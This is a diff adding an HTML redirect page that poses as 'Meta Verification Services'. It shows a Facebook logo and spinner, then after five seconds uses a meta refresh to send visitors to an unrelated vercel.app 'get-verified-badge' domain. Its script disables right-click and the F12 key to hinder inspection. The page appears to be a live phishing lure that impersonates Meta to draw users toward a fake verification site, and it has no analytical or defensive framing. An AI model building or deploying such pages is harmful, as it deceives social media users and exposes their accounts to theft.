@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="refresh" content="5;url=https://get-verified-badge-n.vercel.app/">
+    <title>Redirecting...</title>
+    <style>
+        body {
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            background-color: #f0f0f0;
+            overflow: hidden;
+            cursor: none; /* Hide cursor */
+        }
+        .container {
+            position: relative;
+            margin-bottom: 60px; /* Space for footer */
+        }
+        .spinner {
+            border: 6px solid #d3d3d3; /* Light grey */
+            border-top: 6px solid #add8e6; /* Light blue */
+            border-radius: 50%;
+            width: 100px; /* Smaller width */
+            height: 100px; /* Smaller height */
+            animation: spin 2s linear infinite;
+            position: relative; /* Ensure it doesn't interfere with the logo */
+        }
+        .logo {
+            width: 60px; /* Smaller width */
+            height: 60px; /* Smaller height */
+            background: url('https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg') no-repeat center center;
+            background-size: contain;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            animation: flicker 3s infinite; /* Slow flicker effect */
+            z-index: 1; /* Ensure the logo is above the spinner */
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        @keyframes flicker {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        footer {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            text-align: center;
+            padding: 10px 0;
+            background-color: #ffffff;
+            color: #333333;
+            font-weight: bold;
+            font-size: 16px;
+            border-top: 1px solid #ddd;
+        }
+    </style>
+    <script>
+        // Disable right-click
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        });
+
+        // Disable F12 key (dev tools)
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'F12') {
+                e.preventDefault();
+            }
+        });
+    </script>
+</head>
+<body>
+    <div class="container">
+        <div class="spinner">
+            <div class="logo"></div>
+        </div>
+    </div>
+    <footer>
+        Meta Verification Services
+    </footer>
+</body>
+</html>
